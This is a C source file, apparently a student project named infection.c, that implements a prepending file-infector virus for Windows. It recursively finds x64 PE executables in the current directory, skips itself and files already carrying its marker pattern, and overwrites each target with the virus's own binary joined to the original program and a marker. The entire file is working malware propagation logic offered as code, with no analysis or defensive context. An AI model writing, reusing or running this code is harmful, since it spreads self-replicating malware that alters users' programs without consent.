/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   infection.c                                        :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: jguyet <jguyet@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2017/03/13 12:11:43 by jguyet            #+#    #+#             */
/*   Updated: 2017/03/13 12:15:42 by jguyet           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "infection.h"

int			pack_executables(char **result, char *prefix, int prefix_len, char *suffix, int suffix_len)
{
	char	pattern[] = { PATTERN };
	int		total_len = prefix_len + suffix_len + sizeof(pattern);
	char	*new_exe = NULL;

	if ((new_exe = (char *)malloc(sizeof(char) * total_len)) == NULL)
		return 0;
	memcpy(new_exe									, prefix		, prefix_len);
	memcpy(new_exe + prefix_len						, (char*)pattern, sizeof(pattern));
	memcpy(new_exe + prefix_len + sizeof(pattern)	, suffix		, suffix_len);
	*result = new_exe;
	return (total_len);
}

/*
** Infect windows Portable executable
*/
void		infect_pe_file(char *argv, IMAGE_DOS *img) {
	char	*infection_content = NULL;
	int		infection_size = 0;

	if (is_pe_x64(img->pe_header) == false)
		return ;
	if (strcmp(file_base_name(img->name), file_base_name(argv)) == 0)
		return ;
	if (find_pattern(img->buffer, img->len) != -1)//is file infected
	{
		printf("File \"%s\" is already infected\n", img->name);
		return ;
	}
	if ((infection_size = windows_file_get_contents_size(&infection_content, argv)) <= 0) {
		return ;
	}
	img->new_buffer_len = pack_executables(&img->new_buffer, infection_content, infection_size, img->buffer, img->len);
	printf("File \"%s\" infected\n", img->name);
	windows_file_put_contents_size(img->name, img->new_buffer, img->new_buffer_len);
}

/*
** Infect MS-DOS executable
*/
void		infect_dos_file(char *argv, IMAGE_DOS *img) {
	if (img->len < sizeof(struct _IMAGE_DOS_HEADER) + sizeof(IMAGE_NT_HEADERS)) {
		return ;
	}
	img->dos_header = (IMAGE_DOS_HEADER*)img->buffer;
	img->pe_header = (IMAGE_NT_HEADERS*)(img->buffer + img->dos_header->e_lfanew);
	if (is_pe_signature(img->pe_header))
	{
		infect_pe_file(argv, img);
	}
	free(img);
}

/*
** Infect PE or MS-DOS windows files
*/
void		infect_file(char *argv, char *file_path) {
	char	*file = NULL;
	size_t	size = windows_file_get_contents_size(&file, file_path);
	int		file_type = get_windows_binary_type(file);

	if (file_type == IS_DOS_BINARY_TYPE) {
		IMAGE_DOS *img = (struct _IMAGE_DOS*)malloc(sizeof(struct _IMAGE_DOS));

		if (img == NULL)
			return ;
		img->buffer = file;
		img->len = size;
		img->name = file_path;
		infect_dos_file(argv, img);
	}
}

/*
** Infect with recursivity all Windows binary files (PE, MS-DOS)
*/
void		infect(char *argv) {
	char **files = NULL;

	files = get_files_types(files, ".", is_windows_binary_file);

	for (int i = 0; files[i]; i++) {
		infect_file(argv, files[i]);
	}
	free_array(files);
}
